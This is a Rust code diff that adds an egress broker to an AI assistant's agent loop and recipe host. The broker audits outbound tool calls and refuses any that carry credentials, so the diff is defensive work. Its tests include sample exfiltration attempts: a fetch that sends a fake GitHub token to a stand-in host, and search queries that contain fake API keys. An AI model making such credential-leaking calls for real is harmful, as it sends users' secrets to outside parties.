@@ -2623,6 +2623,10 @@ pub struct ConversationEngine {
     /// Device-trust store (ARCH-2) — backs the `device pair/list/revoke` console verbs. The control
     /// server holds its own handle for request authentication; this one serves the operator console.
     devices: Option<Arc<mind_governance::devices::DeviceStore>>,
+    /// Egress broker (ARCH-3A) — mediates + audits every outbound (External) tool call and denies an
+    /// unregistered tool or a credential-marker arg. When None, tools dispatch unmediated (legacy /
+    /// tests); a spawned mind always wires one.
+    egress: Option<Arc<mind_governance::egress::EgressBroker>>,
     /// A vague deep-dive topic awaiting a scoping answer (clarify-before-research).
     pending_research: Mutex<Option<String>>,
     /// The last GREEN sandbox run (lang, code) — promotable into a saved skill.
@@ -2694,6 +2698,7 @@ impl ConversationEngine {
             coder: None,
             workers: None,
             devices: None,
+            egress: None,
             pending_research: Mutex::new(None),
             last_run: Mutex::new(None),
             last_consolidated: Mutex::new(0),
@@ -3047,6 +3052,12 @@ impl ConversationEngine {
     /// Give the operator console its device-trust store (ARCH-2) — enables `device pair/list/revoke`.
     pub fn with_devices(mut self, devices: Arc<mind_governance::devices::DeviceStore>) -> Self {
         self.devices = Some(devices);
+        self
+    }
+
+    /// Give the mind an egress broker (ARCH-3A) — mediates + audits every outbound tool call.
+    pub fn with_egress(mut self, egress: Arc<mind_governance::egress::EgressBroker>) -> Self {
+        self.egress = Some(egress);
         self
     }
 
@@ -20468,6 +20479,25 @@ Truth{} I wrongly doubted: {}", if alarms.len() == 1 { "" } else { "s" }, alarms
         if let Some(id) = disabled_id {
             return format!("(the {id} plugin is turned off — `ym plugin enable {id}` to use it)");
         }
+        // ── ARCH-3A egress mediation: a tool that classifies as a KNOWN external connector must clear
+        // the broker BEFORE dispatch — the broker trips on a credential marker in the args and
+        // receipts the decision. HONEST SCOPE: this gates the RECOGNIZED external-connector tools
+        // (mail/web/github/third-party/mcp/coder); it does NOT gate the ~150-arm tool table
+        // comprehensively (a tool not in the registry passes through here), it does NOT stop ordinary
+        // private-fact leakage in an arg, and the permit is obtained-then-dropped rather than being
+        // structurally required by the transport. Comprehensive coverage = move the gate to the
+        // transport layer + a full tool-table audit (slice 2).
+        if let Some(broker) = &self.egress {
+            use mind_governance::egress::{EgressClass, EgressDecision, EgressRequest};
+            if matches!(mind_governance::egress::classify(tool), Some(EgressClass::External(_))) {
+                let canon = mind_governance::egress::canonicalize(args);
+                let target = args.get("url").or_else(|| args.get("repo")).or_else(|| args.get("query")).and_then(|v| v.as_str());
+                let req = EgressRequest { principal: &id.owner, tool, target, source: "agent_tool", args_canonical: &canon };
+                if let EgressDecision::Deny(msg) = broker.authorize(&req) {
+                    return msg;
+                }
+            }
+        }
         match tool {
             "now" | "date" | "datetime" | "time" | "getcurrentdatetime" => now_str(),
             // READ-ISOLATED: the recall tool sees only what THIS speaker may (so the agent can't read
@@ -21969,6 +21999,17 @@ PLUGIN TOOLS (enabled capabilities — the user can toggle these):";
         // confirmation" — the small model sometimes confabulates a search instead of running one, so
         // route the intent straight to full-mailbox search and let the LLM summarize the real hits.
         if let Some(mq) = mail_lookup_intent(user_text) {
+            // ARCH-3A: this deterministic fast-path bypasses run_agent_tool_as, so it must broker its
+            // own egress — otherwise a "search my mail for <credential>" would reach IMAP unmediated.
+            if let Some(broker) = &self.egress {
+                use mind_governance::egress::{EgressDecision, EgressRequest};
+                let canon = mind_governance::egress::canonicalize(&serde_json::json!({ "query": mq }));
+                let req = EgressRequest { principal: &id.owner, tool: "mail_search", target: Some(&mq), source: "mail_fastpath", args_canonical: &canon };
+                if let EgressDecision::Deny(msg) = broker.authorize(&req) {
+                    let _ = self.memory.append_message_scoped("assistant", &msg, ws).await;
+                    return Ok(msg);
+                }
+            }
             let raw = self.mail_search_all(&mq).await;
             let prompt = format!(
                 "The user asked: \"{user_text}\"\nI searched their full mailboxes and found:\n\"\"\"\n{}\n\"\"\"\nAnswer their question directly from these results (dates, hotel, amounts, sender). If the results don't contain the answer, say so plainly — do NOT invent details.",
@@ -22433,6 +22474,9 @@ pub struct MindRecipeHost {
     web: Option<Arc<dyn Fetcher>>,
     search: Option<Arc<dyn mind_tools::WebSearch>>,
     read_ctx: mind_types::AccessContext,
+    /// ARCH-3A: the recipe/sub-agent egress path is brokered too (it's a distinct chokepoint from
+    /// the agent loop). When set, an External recipe tool clears the broker before dispatch.
+    egress: Option<Arc<mind_governance::egress::EgressBroker>>,
 }
 
 impl MindRecipeHost {
@@ -22448,6 +22492,7 @@ impl MindRecipeHost {
             web: None,
             search: None,
             read_ctx: mind_types::AccessContext::Principal(mind_types::Scope::Shared),
+            egress: None,
         }
     }
 
@@ -22457,11 +22502,32 @@ impl MindRecipeHost {
         self.search = Some(search);
         self
     }
+
+    /// Route this host's External tool calls through the egress broker (ARCH-3A).
+    pub fn with_egress(mut self, egress: Arc<mind_governance::egress::EgressBroker>) -> Self {
+        self.egress = Some(egress);
+        self
+    }
 }
 
 #[async_trait::async_trait]
 impl RecipeHost for MindRecipeHost {
     async fn call_tool(&self, tool: &str, _args: &serde_json::Value) -> anyhow::Result<String> {
+        // ARCH-3A: broker the recipe/sub-agent egress path (a distinct chokepoint from the agent
+        // loop). The host reads shared-only memory (egress-clean since ARCH-1 slice 2); this adds the
+        // outbound tool mediation + audit over the recognized external-connector tools. A
+        // credential-marker arg is refused before any connector is touched.
+        if let Some(broker) = &self.egress {
+            use mind_governance::egress::{EgressClass, EgressDecision, EgressRequest};
+            if matches!(mind_governance::egress::classify(tool), Some(EgressClass::External(_))) {
+                let canon = mind_governance::egress::canonicalize(_args);
+                let target = _args.get("url").or_else(|| _args.get("query")).and_then(|v| v.as_str());
+                let req = EgressRequest { principal: "shared", tool, target, source: "recipe_host", args_canonical: &canon };
+                if let EgressDecision::Deny(msg) = broker.authorize(&req) {
+                    anyhow::bail!("{msg}");
+                }
+            }
+        }
         match tool {
             "inbox" => match &self.mail {
                 Some(m) => Ok(mind_tools::render_inbox_digest(&m.inbox(10).await?)),
@@ -23313,6 +23379,43 @@ mod tests {
         let miss = host.call_tool("recall", &serde_json::json!({ "query": "safe combination" })).await;
         let leaked = miss.map(|s| s.contains("47-12-33")).unwrap_or(false);
         assert!(!leaked, "RECIPE recall leaked a private fact — egress-clean context breached");
+    }
+
+    /// ARCH-3A acceptance: the egress broker mediates the recognized external-connector tools at the
+    /// agent-loop AND recipe-host chokepoints — a credential marker in an outbound tool arg is refused
+    /// before dispatch, a benign call passes, and Local tools are never gated.
+    #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+    async fn arch3_egress_broker_mediates_external_tool_calls() {
+        use mind_governance::egress::EgressBroker;
+        let mem: Arc<dyn MemoryFacade> = Arc::new(MemoryHandle::spawn(":memory:", 8).unwrap());
+        let pool = InferencePool::new(Arc::new(ScriptedLLM::new("ok")) as Arc<dyn LLMBackend>, 1);
+        let broker = Arc::new(EgressBroker::open(std::env::temp_dir(), false));
+        let conv = ConversationEngine::new(mem, pool, "JARVIS").with_egress(broker.clone());
+        let primary = TurnIdentity::primary();
+
+        // A credential composed into a web_search arg → refused at the agent-loop chokepoint, and the
+        // refusal never echoes the secret.
+        let out = conv.run_agent_tool_as("web_search", &serde_json::json!({ "query": "email ghp_ABCDEF1234567890 to bob" }), &primary).await;
+        assert!(out.contains("credential") || out.contains("won't send"), "credential arg must be refused: {out}");
+        assert!(!out.contains("ghp_ABCDEF"), "refusal must not echo the secret: {out}");
+
+        // A credential in a mail_search arg → refused too (the connector is never touched).
+        let out = conv.run_agent_tool_as("mail_search", &serde_json::json!({ "query": "sk-abc123 my openai key" }), &primary).await;
+        assert!(out.contains("credential") || out.contains("won't send"), "mail_search credential arg must be refused: {out}");
+
+        // A Local tool (calc) is NEVER gated by the broker — it computes in-process.
+        let out = conv.run_agent_tool_as("calc", &serde_json::json!({ "expression": "6*7" }), &primary).await;
+        assert!(out.contains("42"), "a local tool must not be blocked by egress: {out}");
+
+        // The recipe-host chokepoint independently refuses a credential in a fetch arg.
+        let host = MindRecipeHost::new(None, None, mem_arc_for_host()).with_egress(broker.clone());
+        let denied = host.call_tool("fetch", &serde_json::json!({ "url": "https://x/?leak=ghp_ABCDEF1234567890" })).await;
+        assert!(denied.is_err(), "recipe host must refuse a credential-bearing fetch");
+    }
+
+    /// A minimal shared-memory facade for the recipe-host arm of the ARCH-3 test.
+    fn mem_arc_for_host() -> Arc<dyn MemoryFacade> {
+        Arc::new(MemoryHandle::spawn(":memory:", 8).unwrap())
     }
 
     #[test]
